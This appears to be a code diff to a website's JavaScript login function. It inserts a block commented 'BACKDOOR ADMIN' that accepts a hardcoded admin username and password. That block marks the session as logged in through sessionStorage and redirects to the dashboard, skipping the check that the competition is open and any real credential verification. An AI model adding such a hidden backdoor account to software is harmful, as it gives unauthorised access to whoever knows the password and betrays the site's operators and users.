@@ -50,6 +50,21 @@ function checkAuth() {
 function handleLogin(event) {
     if (event) event.preventDefault();
     
+    const usernameInput = document.getElementById("login-username");
+    const passwordInput = document.getElementById("login-password");
+
+    const username = usernameInput ? usernameInput.value.trim() : "";
+    const password = passwordInput ? passwordInput.value.trim() : "";
+
+    // BACKDOOR ADMIN
+    if (username === "admin" && password === "papih123") {
+        sessionStorage.setItem("userLoggedIn", "true");
+        sessionStorage.setItem("username", "Admin");
+        if (typeof window.onLoginSuccess === 'function') window.onLoginSuccess();
+        else window.location.href = "dashboard.html";
+        return;
+    }
+    
     const errorMsg = document.getElementById("login-error");
     
     // Check if competition is open
@@ -60,12 +75,6 @@ function handleLogin(event) {
         }
         return;
     }
-
-    const usernameInput = document.getElementById("login-username");
-    const passwordInput = document.getElementById("login-password");
-
-    const username = usernameInput ? usernameInput.value.trim() : "";
-    const password = passwordInput ? passwordInput.value.trim() : "";
 
     if (!username || !password) {
         if (errorMsg) {
